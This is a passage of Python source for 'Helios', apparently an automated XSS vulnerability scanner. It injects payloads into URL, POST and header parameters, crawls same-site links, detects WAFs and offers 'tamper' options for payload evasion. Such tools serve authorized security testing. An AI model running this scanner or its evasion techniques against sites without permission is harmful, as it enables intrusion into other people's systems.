                    f"[*] Header {bcolors.PARAM}{header}{bcolors.ENDC} → {bcolors.WARNING}{payload}{bcolors.ENDC}"
                )
                test_headers = {**self.custom_headers, header: self.customize_payload(payload)}
                try:
                    async with self.session.get(
                        self.target_url, headers=test_headers
                    ) as resp:
                        self.log_request()
                        body = await resp.text()
                    if payload in body or self.canary_string in body:
                        self.print_and_save(
                            f"[+] XSS reflected in header: {header}", important=True
                        )
                        self.vulnerabilities_found.append({
                            'type': 'Header-Reflected XSS',
                            'method': 'GET',
                            'url': self.target_url,
                            'payload': payload,
                            'parameter': header,
                        })
                except Exception:
                    pass
        return results

    # ── crawl ────────────────────────────────────────────────────────────────

    async def crawl_website(self, url: str, depth: int):
        if depth == 0 or url in self.discovered_urls:
            return
        self.discovered_urls.add(url)
        self.print_and_save(f"[*] Crawling: {url}", important=True)
        try:
            async with self.session.get(url) as resp:
                text = await resp.text()
            soup  = BeautifulSoup(text, 'html.parser')
            links = [
                urllib.parse.urljoin(url, a['href'])
                for a in soup.find_all('a', href=True)
            ]
            base = urllib.parse.urlparse(self.target_url)
            valid = [
                lnk for lnk in links
                if urllib.parse.urlparse(lnk).netloc == base.netloc
                and lnk not in self.discovered_urls
            ]
            for lnk in valid:
                self.discovered_urls.add(lnk)
            await asyncio.gather(*[self.crawl_website(lnk, depth - 1) for lnk in valid])
        except Exception as exc:
            self.print_and_save(f"[!] Crawl error {url}: {exc}", important=True)

    # ── single URL scan ──────────────────────────────────────────────────────

    async def scan_single_url(self, url: str) -> list:
        if url in self.scanned_urls:
            return []
        self.print_and_save(f"[*] Scanning: {url}")
        results = []
        prev_target = self.target_url
        self.target_url = url
        try:
            await asyncio.to_thread(self.driver.get, url)
            self.log_request()
            await self.smart_wait()

            if self.detected_wafs:
                results.append("[!] WAF active – some payloads may be blocked.")

            results.extend(await self.scan_url_parameters())
            results.extend(await self.scan_post_parameters())
            results.extend(await self.scan_dom_content())

            if not self.skip_header_scan:
                results.extend(await self.scan_headers())

            self.scanned_urls.add(url)
        except Exception as exc:
            self.print_and_save(f"[!] Error scanning {url}: {exc}", important=True)
        finally:
            self.target_url = prev_target
        return results

    # ── queue worker ─────────────────────────────────────────────────────────

    async def _process_queue(self):
        while True:
            try:
                url = await self.url_queue.get()
                try:
                    await self.scan_single_url(url)
                except Exception as exc:
                    self.print_and_save(f"[!] Worker error {url}: {exc}", important=True)
                finally:
                    self.url_queue.task_done()
            except asyncio.CancelledError:
                break
            if self.url_queue.empty():
                break

    # ── main scan entry ──────────────────────────────────────────────────────

    async def run_scan(self):
        self.print_and_save(f"[*] Starting scan → {self.target_url}", important=True)
        start_time = time.time()
        self.start_rps_monitor()

        try:
            await self.create_session()
            self.driver = await asyncio.to_thread(self.setup_driver)
            if self.driver is None:
                self.print_and_save("[!] Browser setup failed.", important=True)
                return

            await self.detect_waf()

            self.url_queue: asyncio.Queue = asyncio.Queue()

            if self.crawl:
                await self.crawl_website(self.target_url, self.crawl_depth)
                self.print_and_save(
                    f"[*] Crawl done – {len(self.discovered_urls)} URLs found.", important=True
                )
            else:
                self.discovered_urls.add(self.target_url)

            for url in self.discovered_urls:
                await self.url_queue.put(url)
                self.print_and_save(f"[*] Queued: {url}", important=True)

            workers = [
                asyncio.create_task(self._process_queue())
                for _ in range(min(self.threads, max(1, len(self.discovered_urls))))
            ]
            await self.url_queue.join()
            for w in workers:
                w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)

        except asyncio.CancelledError:
            self.print_and_save("\n[!] Scan cancelled.", important=True)
        except Exception as exc:
            self.print_and_save(f"\n[!] Unexpected error: {exc}", important=True)
            import traceback
            self.print_and_save(traceback.format_exc(), important=True)
        finally:
            elapsed = time.time() - start_time
            sys.stdout.write('\r\033[K')
            sys.stdout.flush()

            if self.vulnerabilities_found:
                self.print_and_save("\n[*] ── Scan Summary ──────────────────────────", important=True)
                for vuln in self.vulnerabilities_found:
                    self.print_and_save(
                        f"[+] {vuln['type']} | {vuln['method']} | param: {vuln['parameter']}",
                        important=True,
                    )
                    self.print_and_save(f"    URL:     {vuln['url']}", important=True)
                    self.print_and_save(f"    Payload: {vuln['payload']}", important=True)
            else:
                self.print_and_save("[*] No vulnerabilities found.", important=True)

            print(f"\n{bcolors.PURPLE}Finished in {elapsed:.2f}s{bcolors.ENDC}")
            self.print_and_save(
                f"{bcolors.WARNING}[!]{bcolors.ENDC} Helios done → {self.target_url}", important=True
            )
            await self.cleanup()


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

async def async_main():
    parser = argparse.ArgumentParser(
        description="Helios v0.4 – Automated XSS Scanner (Arch/Hyprland 2026)"
    )
    parser.add_argument("target", nargs='?', help="Target URL")
    parser.add_argument("-l", "--target-list", help="File of target URLs (one per line)")
    parser.add_argument("--verbose",    action="store_true")
    parser.add_argument(
        "--browser",
        choices=['firefox', 'chrome', 'chromium'],
        default='firefox',
        help="Browser driver (default: firefox)",
    )
    parser.add_argument("--headless",   action="store_true")
    parser.add_argument("--threads",    type=int, default=10)
    parser.add_argument("--headers",    nargs='+', help="'Name:Value' pairs")
    parser.add_argument("--cookies",    nargs='+', help="'Name=Value' pairs")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("--payload-file", help="Custom payload list")
    parser.add_argument("--scan-headers", action="store_true")
    parser.add_argument("--crawl",       action="store_true")
    parser.add_argument("--crawl-depth", type=int, default=2)
    parser.add_argument(
        "--tamper",
        choices=list(_TAMPER_MAP.keys()) + ['all'],
        help="Payload evasion technique",
    )
    args = parser.parse_args()

    if not args.target and not args.target_list:
        parser.error("Provide a target URL or --target-list.")

    custom_headers: dict = {}
    if args.headers:
        for h in args.headers:
            k, v = h.split(':', 1)
            custom_headers[k.strip()] = v.strip()

    cookies: dict = {}
    if args.cookies:
        for c in args.cookies:
            k, v = c.split('=', 1)
            cookies[k.strip()] = v.strip()

    targets: list = []
    if args.target_list:
        with open(args.target_list, 'r', encoding='utf-8') as fh:
            targets = [l.strip() for l in fh if l.strip()]
        print(f"[*] Loaded {len(targets)} targets from {args.target_list}")
    else:
        targets = [args.target]

    try:
        for target in targets:
            print(f"{bcolors.OKBLUE}[*]{bcolors.ENDC} Target: {bcolors.BOLD}{target}{bcolors.ENDC}\n")
            scanner = XSSScanner(
                target,
                args.browser,
                args.headless,
                args.threads,
                custom_headers,
                cookies,
                args.output,
                args.payload_file,
                args.tamper,
            )
            scanner.verbose          = args.verbose
            scanner.skip_header_scan = not args.scan_headers
            scanner.crawl            = args.crawl
            scanner.crawl_depth      = args.crawl_depth
            await scanner.run_scan()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
    finally:
        pending = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
        for t in pending:
            t.cancel()
        await asyncio.gather(*pending, return_exceptions=True)


def main():
    uvloop.install()          # preferred over set_event_loop_policy in uvloop ≥ 0.20
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
    except Exception as exc:
        print(f"[!] Fatal: {exc}")
    finally:
        sys.exit(0)


if __name__ == "__main__":
    banner()
    main()
